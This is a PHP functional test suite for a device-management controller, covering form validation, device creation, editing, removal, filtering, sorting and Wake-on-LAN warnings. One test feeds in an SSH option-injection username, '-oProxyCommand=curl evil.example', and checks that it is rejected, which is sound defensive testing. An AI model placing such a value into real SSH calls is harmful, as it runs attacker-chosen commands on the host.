<?php

declare(strict_types=1);

namespace EvilStudio\HAT\Tests\Functional\Controller;

use EvilStudio\HAT\Contract\DevicePlatform;
use EvilStudio\HAT\Contract\ScheduleInterface;
use EvilStudio\HAT\Service\Application\DeviceService;
use EvilStudio\HAT\Service\Application\ScheduleService;
use EvilStudio\HAT\Service\Application\UpsService;
use EvilStudio\HAT\Service\Runtime\DeviceOperationsService;
use EvilStudio\HAT\Tests\Functional\Support\HttpFunctionalTestCase;
use Symfony\Component\HttpFoundation\Response;

class DeviceControllerFunctionalTest extends HttpFunctionalTestCase
{
    public function testNewShowsValidationErrorsForInvalidPayload(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $response = $this->request('POST', '/devices/new', [
            'name' => '',
            'ip' => 'not-an-ip',
            'mac' => 'invalid-mac',
            'platform' => 'invalid-platform',
            'username' => 'root',
            'ups_id' => '999999',
            'threshold_minutes' => '-1',
        ]);

        $this->assertSame(Response::HTTP_OK, $response->getStatusCode());
        $content = html_entity_decode((string)$response->getContent(), ENT_QUOTES);
        $this->assertStringContainsString('Device name is required.', $content);
        $this->assertStringContainsString('A valid IP address is required.', $content);
        $this->assertStringContainsString(
            'A valid MAC address is required (format: 00:11:22:33:44:55).',
            $content
        );
        $this->assertStringContainsString('Platform must be one of:', $content);
        $this->assertStringContainsString('Threshold must be a non-negative integer.', $content);
        $this->assertStringContainsString('Selected UPS entry does not exist.', $content);
        $this->assertCount(0, static::getContainer()->get(DeviceService::class)->listDevices());
    }

    public function testNewRejectsUsernameThatSshWouldParseAsAnOption(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $response = $this->request('POST', '/devices/new', [
            'name' => 'node-1',
            'ip' => '10.0.0.10',
            'mac' => '00:11:22:33:44:55',
            'platform' => DevicePlatform::LINUX->value,
            'username' => '-oProxyCommand=curl evil.example',
            'ups_id' => '',
            'threshold_minutes' => '',
        ]);

        $this->assertSame(Response::HTTP_OK, $response->getStatusCode());
        $content = html_entity_decode((string)$response->getContent(), ENT_QUOTES);
        $this->assertStringContainsString('cannot start with a dash', $content);
        $this->assertCount(0, static::getContainer()->get(DeviceService::class)->listDevices());
    }

    public function testNewCreatesDeviceAndRedirectsToIndex(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $ups = static::getContainer()->get(UpsService::class)->createUps(
            'Main UPS',
            'ups-main',
            '127.0.0.1',
            600
        );

        $response = $this->request('POST', '/devices/new', [
            'name' => 'node-1',
            'ip' => '10.0.0.10',
            'mac' => '00:11:22:33:44:55',
            'platform' => DevicePlatform::LINUX->value,
            'username' => 'root',
            'ups_id' => (string)$ups->getId(),
            'threshold_minutes' => '5',
            'allow_auto_stop_present' => '1',
            'allow_auto_stop' => '1',
        ]);

        $this->assertSame(Response::HTTP_FOUND, $response->getStatusCode());
        $this->assertSame('/devices', $response->headers->get('Location'));

        $device = static::getContainer()->get(DeviceService::class)->getDeviceByName('node-1');
        $this->assertSame(DevicePlatform::LINUX->value, $device->getPlatform());
        $this->assertSame($ups->getId(), $device->getUps()?->getId());
        $this->assertSame(300, $device->getUpsLowBatteryRuntimeThreshold());
        $this->assertTrue($device->isAutoStopAllowed());
    }

    public function testNewCreatesDeviceWithAutoStopDisabledWhenCheckboxIsUnchecked(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $response = $this->request('POST', '/devices/new', [
            'name' => 'node-1-no-auto-stop',
            'ip' => '10.0.0.12',
            'mac' => '00:11:22:33:44:77',
            'platform' => DevicePlatform::GENERIC->value,
            'username' => '',
            'ups_id' => '',
            'threshold_minutes' => '',
            'allow_auto_stop_present' => '1',
        ]);

        $this->assertSame(Response::HTTP_FOUND, $response->getStatusCode());
        $this->assertSame('/devices', $response->headers->get('Location'));

        $device = static::getContainer()->get(DeviceService::class)->getDeviceByName('node-1-no-auto-stop');
        $this->assertFalse($device->isAutoStopAllowed());
    }

    public function testEditUpdatesDeviceAndRedirectsToEditPage(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $upsService = static::getContainer()->get(UpsService::class);
        $deviceService = static::getContainer()->get(DeviceService::class);

        $initialUps = $upsService->createUps('Primary UPS', 'ups-primary', '10.0.0.2', 900);
        $targetUps = $upsService->createUps('Secondary UPS', 'ups-secondary', '10.0.0.3', 600);

        $device = $deviceService->createDevice(
            'node-1',
            '10.0.0.10',
            '00:11:22:33:44:55',
            DevicePlatform::GENERIC->value,
            'root',
            300,
            (int)$initialUps->getId()
        );

        $response = $this->request('POST', sprintf('/devices/%d/edit', (int)$device->getId()), [
            'name' => 'node-1-renamed',
            'ip' => '10.0.0.20',
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'platform' => DevicePlatform::LINUX->value,
            'username' => 'admin',
            'ups_id' => (string)$targetUps->getId(),
            'threshold_minutes' => '12',
            'allow_auto_stop_present' => '1',
        ]);

        $this->assertSame(Response::HTTP_FOUND, $response->getStatusCode());
        $this->assertSame(
            sprintf('/devices/%d/edit', (int)$device->getId()),
            $response->headers->get('Location')
        );

        $this->entityManager->clear();
        $updatedDevice = static::getContainer()->get(DeviceService::class)->getDeviceById((int)$device->getId());
        $this->assertSame('node-1-renamed', $updatedDevice->getName());
        $this->assertSame('10.0.0.20', $updatedDevice->getIp());
        $this->assertSame('AA:BB:CC:DD:EE:FF', $updatedDevice->getMac());
        $this->assertSame(DevicePlatform::LINUX->value, $updatedDevice->getPlatform());
        $this->assertSame('admin', $updatedDevice->getUsername());
        $this->assertNotNull($updatedDevice->getUps());
        $this->assertSame(720, $updatedDevice->getUpsLowBatteryRuntimeThreshold());
        $this->assertFalse($updatedDevice->isAutoStopAllowed());
    }

    public function testRemoveDeletesDeviceAndDetachesScheduleLink(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $deviceService = static::getContainer()->get(DeviceService::class);
        $scheduleService = static::getContainer()->get(ScheduleService::class);

        $device = $deviceService->createDevice(
            'node-remove',
            '10.0.0.30',
            '00:aa:bb:cc:dd:ee',
            DevicePlatform::GENERIC->value
        );
        $schedule = $scheduleService->createSchedule(
            'Schedule Linked To Device',
            '* * * * *',
            ScheduleInterface::COMMAND_START,
            [(int)$device->getId()],
            true
        );

        $confirmResponse = $this->request('GET', sprintf('/devices/%d/remove', (int)$device->getId()));
        $this->assertSame(Response::HTTP_OK, $confirmResponse->getStatusCode());
        $this->assertStringContainsString('Schedule Linked To Device', (string)$confirmResponse->getContent());

        $removeResponse = $this->request('POST', sprintf('/devices/%d/remove', (int)$device->getId()));
        $this->assertSame(Response::HTTP_FOUND, $removeResponse->getStatusCode());
        $this->assertSame('/devices', $removeResponse->headers->get('Location'));

        $this->assertCount(0, $deviceService->listDevices());
        $updatedSchedule = $scheduleService->getScheduleById((int)$schedule->getId());
        $this->assertCount(0, $updatedSchedule->getDevices());
    }

    public function testIndexAppliesPlatformFilterAndNormalizesOutOfRangePage(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $deviceService = static::getContainer()->get(DeviceService::class);
        for ($index = 1; $index <= 28; $index++) {
            $platform = $index <= 2 ? DevicePlatform::LINUX->value : DevicePlatform::GENERIC->value;
            $deviceService->createDevice(
                sprintf('node-filter-%02d', $index),
                sprintf('10.20.0.%d', $index),
                sprintf('aa:bb:cc:dd:ee:%02x', $index),
                $platform
            );
        }

        $response = $this->request('GET', '/devices?platform=linux&page=999');

        $this->assertSame(Response::HTTP_OK, $response->getStatusCode());
        $content = (string)$response->getContent();
        $this->assertStringContainsString('Showing page 1 / 1 (2 results)', $content);
        $this->assertStringContainsString('node-filter-01', $content);
        $this->assertStringContainsString('node-filter-02', $content);
        $this->assertStringNotContainsString('node-filter-28', $content);
    }

    public function testIndexSortsByNetworkByDefaultAndSupportsNameIdSortDirection(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $deviceService = static::getContainer()->get(DeviceService::class);
        $deviceService->createDevice(
            'node-net-20',
            '10.55.0.20',
            '00:aa:bb:cc:dd:20',
            DevicePlatform::GENERIC->value
        );
        $deviceService->createDevice(
            'node-net-3',
            '10.55.0.3',
            '00:aa:bb:cc:dd:03',
            DevicePlatform::GENERIC->value
        );
        $deviceService->createDevice(
            'node-net-100',
            '10.55.0.100',
            '00:aa:bb:cc:dd:64',
            DevicePlatform::GENERIC->value
        );

        $defaultResponse = $this->request('GET', '/devices');
        $this->assertSame(Response::HTTP_OK, $defaultResponse->getStatusCode());
        $this->assertDevicesOrder(
            (string)$defaultResponse->getContent(),
            ['node-net-3', 'node-net-20', 'node-net-100']
        );

        $explicitSortResponse = $this->request('GET', '/devices?sort_by=name_id&sort_dir=desc');
        $this->assertSame(Response::HTTP_OK, $explicitSortResponse->getStatusCode());
        $this->assertDevicesOrder(
            (string)$explicitSortResponse->getContent(),
            ['node-net-100', 'node-net-3', 'node-net-20']
        );
    }

    public function testStartShowsWarningFlashWhenRuntimeStartReturnsFalse(): void
    {
        $this->createSimpleUser('admin', 'secret-1');
        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');

        $device = static::getContainer()->get(DeviceService::class)->createDevice(
            'node-start-warning',
            '10.30.0.10',
            '00:11:22:33:55:77',
            DevicePlatform::GENERIC->value
        );

        $deviceOperationsService = $this->createMock(DeviceOperationsService::class);
        $deviceOperationsService
            ->expects($this->once())
            ->method('startDevice')
            ->with('node-start-warning')
            ->willReturn(false);
        static::getContainer()->set(DeviceOperationsService::class, $deviceOperationsService);

        $startResponse = $this->request('POST', sprintf('/devices/%d/start', (int)$device->getId()));
        $this->assertSame(Response::HTTP_FOUND, $startResponse->getStatusCode());
        $this->assertSame('/devices', $startResponse->headers->get('Location'));

        $indexResponse = $this->request('GET', '/devices');
        $this->assertSame(Response::HTTP_OK, $indexResponse->getStatusCode());
        $content = html_entity_decode((string)$indexResponse->getContent(), ENT_QUOTES);
        $this->assertStringContainsString(
            "Wake-on-LAN packet could not be sent to device 'node-start-warning'.",
            $content
        );
    }

    protected function assertDevicesOrder(string $content, array $orderedDeviceNames): void
    {
        $previousPosition = -1;
        foreach ($orderedDeviceNames as $deviceName) {
            $position = strpos($content, $deviceName);
            $this->assertNotFalse($position, sprintf("Device '%s' not found in response content.", $deviceName));
            $this->assertGreaterThan(
                $previousPosition,
                $position,
                sprintf("Device '%s' is not in expected order.", $deviceName)
            );
            $previousPosition = $position;
        }
    }
}
